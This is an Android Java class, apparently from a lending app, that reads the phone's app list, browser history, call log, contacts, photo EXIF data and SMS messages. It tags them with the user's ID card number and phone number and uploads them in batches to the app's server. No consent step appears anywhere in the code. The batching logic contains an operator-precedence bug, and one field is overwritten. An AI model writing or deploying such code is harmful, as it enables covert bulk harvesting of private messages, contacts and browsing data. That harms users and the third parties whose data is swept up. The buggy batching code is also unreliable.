package com.fiveoneofly.cgw.calm;

import android.content.Context;
import android.support.annotation.IntDef;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fiveoneofly.cgw.app.manage.UserManage;
import com.fiveoneofly.cgw.net.ApiBatch;
import com.fiveoneofly.cgw.utils.DateUtil;
import com.fiveoneofly.cgw.utils.LogUtil;
import com.yxjr.credit.constants.HttpService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.util.Map;
import java.util.UUID;

/**
 * Created by xiaochangyou on 2018/4/18.
 */

public class CalmRunnable implements Runnable {

    public static final int ITEM_APP_LIST = 0;
    public static final int ITEM_BROWSER_HISTORY = 1;
    public static final int ITEM_CALL_LOG = 2;
    public static final int ITEM_CONTACTS = 3;
    public static final int ITEM_PHOTO = 4;
    public static final int ITEM_SMS = 5;
    @ItemType
    private int mItemType;

    @Retention(RetentionPolicy.SOURCE)
    @IntDef({
            ITEM_APP_LIST,
            ITEM_BROWSER_HISTORY,
            ITEM_CALL_LOG,
            ITEM_CONTACTS,
            ITEM_PHOTO,
            ITEM_SMS
    })
    @interface ItemType {
    }

    private boolean mSend;      // 是否发送
    private long mLastTime;     // 最否发送时间
    private int mBatchVolume;   // 每批数量

    private Context mContext;
    private JSONObject mRequestObj;// 发送的基础数据

    private ObjectMapper mObjectMapper;

    CalmRunnable(Context context, boolean send, String lastTime, int batchVolume, @ItemType int itemType) {
        this.mContext = context.getApplicationContext();
        this.mSend = send;
        this.mLastTime = DateUtil.date2Long(lastTime);
        this.mBatchVolume = batchVolume;
        this.mItemType = itemType;

        String idCard = UserManage.get(context).userCert();
        String phoneNo = UserManage.get(context).phoneNo();

        try {
            mRequestObj = new JSONObject();
            mRequestObj.put("cert", idCard);
            mRequestObj.put("mobileNo", phoneNo);
            mRequestObj.put("partnerLoginId", UserManage.get(context).userCertMD5());

        } catch (JSONException e) {
            e.printStackTrace();
        }
        mObjectMapper = new ObjectMapper();
    }

    @Override
    public void run() {
        switch (mItemType) {
            case ITEM_APP_LIST:
                handleApplist();
                break;
            case ITEM_BROWSER_HISTORY:
                handleBrowserHistory();
                break;
            case ITEM_CALL_LOG:
                handleCallLog();
                break;
            case ITEM_CONTACTS:
                handleContacts();
                break;
            case ITEM_PHOTO:
                handlePhoto();
                break;
            case ITEM_SMS:
                handleSMS();
                break;
            default:
                break;
        }

    }

    // app列表处理
    private void handleApplist() {
        try {
            if (mSend && mBatchVolume != 0) {
                LogUtil.d("handleApplist", "start-handleApplist");
                batchJSONArray(new ItemAppList().getData(mContext), mBatchVolume, new OnBatchListener() {
                    @Override
                    public void onBatch(JSONArray array) throws JSONException {
                        mRequestObj.put("appListInfo", array);
                        requestServer(mContext, HttpService.SEND_APP_LIST, mRequestObj);
                        LogUtil.d("handleApplist", "BatchSend-handleApplist");
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 浏览器记录处理
    private void handleBrowserHistory() {
        try {
            if (mSend && mBatchVolume != 0) {
                LogUtil.d("handleBrowserHistory", "start-handleBrowserHistory");
                batchJSONArray(new ItemBrowserHistory().getData(mContext, mLastTime), mBatchVolume, new OnBatchListener() {
                    @Override
                    public void onBatch(JSONArray array) throws JSONException {
                        mRequestObj.put("browserHistoryInfo", array);
                        requestServer(mContext, HttpService.SEND_BROWSER_HISTORY, mRequestObj);
                        LogUtil.d("handleBrowserHistory", "BatchSend-handleBrowserHistory");
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 通话记录处理
    private void handleCallLog() {
        try {
            if (mSend && mBatchVolume != 0) {
                LogUtil.d("handleCallLog", "start-handleCallLog");
                batchJSONArray(new ItemCallLog().getData(mContext, mLastTime), mBatchVolume, new OnBatchListener() {
                    @Override
                    public void onBatch(JSONArray array) throws JSONException {
                        mRequestObj.put("callLogInfo", array);
                        requestServer(mContext, HttpService.SEND_CALL_LOG, mRequestObj);
                        LogUtil.d("handleCallLog", "BatchSend-handleCallLog");
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 联系人处理
    private void handleContacts() {
        try {
            if (mSend && mBatchVolume != 0) {
                LogUtil.d("handleContacts", "start-handleContacts");
                batchJSONArray(new ItemContacts().getData(mContext), mBatchVolume, new OnBatchListener() {
                    @Override
                    public void onBatch(JSONArray array) throws JSONException {
                        mRequestObj.put("contacts", array);
                        requestServer(mContext, HttpService.SEND_CONTACTS, mRequestObj);
                        LogUtil.d("handleContacts", "BatchSend-handleContacts");
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 照片处理
    private void handlePhoto() {
        try {
            if (mSend && mBatchVolume != 0) {
                LogUtil.d("handlePhoto", "start-handlePhoto");
                final JSONArray data = new ItemPhoto().getData(mLastTime);
                final UUID uuid = UUID.randomUUID();
                batchJSONArray(data, mBatchVolume, new OnBatchListener() {
                    @Override
                    public void onBatch(JSONArray array) throws JSONException {
                        mRequestObj.put("batchNo", mRequestObj.get("mobileNo"));
                        mRequestObj.put("batchNo", uuid);
                        mRequestObj.put("count", data.length());
                        mRequestObj.put("list", array);

                        requestServer(mContext, HttpService.SEND_IMG_EXIF, mRequestObj);
                        LogUtil.d("handlePhoto", "BatchSend-handlePhoto");
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 短信处理
    private void handleSMS() {
        try {
            if (mSend && mBatchVolume != 0) {
                LogUtil.d("handleSMS", "start-handleSMS");
                batchJSONArray(new ItemSMS().getData(mContext, mLastTime), mBatchVolume, new OnBatchListener() {
                    @Override
                    public void onBatch(JSONArray array) throws JSONException {
                        mRequestObj.put("smsInfo", array);
                        requestServer(mContext, HttpService.SEND_SMS, mRequestObj);
                        LogUtil.d("handleSMS", "BatchSend-handleSMS");
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 数据分批
    private void batchJSONArray(JSONArray array, int batchVolume, OnBatchListener batchListener) throws JSONException {
        if (batchVolume == 0) {
            batchListener.onBatch(array);
        }
        JSONArray tempArray = new JSONArray();
        for (int i = 0; i < array.length(); i++) {
            Object object = array.get(i);
            tempArray.put(object);
            int nextIndex = i + 1;
            if (nextIndex > 0 && nextIndex % batchVolume == 0) {//不是第0条数据 且 能被batchVolume整除 或 到了最后1条数据
                batchListener.onBatch(tempArray);
                tempArray = new JSONArray();
            } else {
                if (array.length() - 1 % batchVolume != 0 && i == array.length() - 1 || array.length() == 1) {
                    batchListener.onBatch(tempArray);
                    tempArray = new JSONArray();
                }
            }
        }
    }

    // 数据发送
    private void requestServer(Context context, String serviceId, JSONObject jsonObject) {

        try {
            Map map = mObjectMapper.readValue(jsonObject.toString(), Map.class);
            new ApiBatch().request(context, serviceId, map);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    interface OnBatchListener {
        /**
         * 每批数据
         */
        void onBatch(JSONArray array) throws JSONException;
    }
}
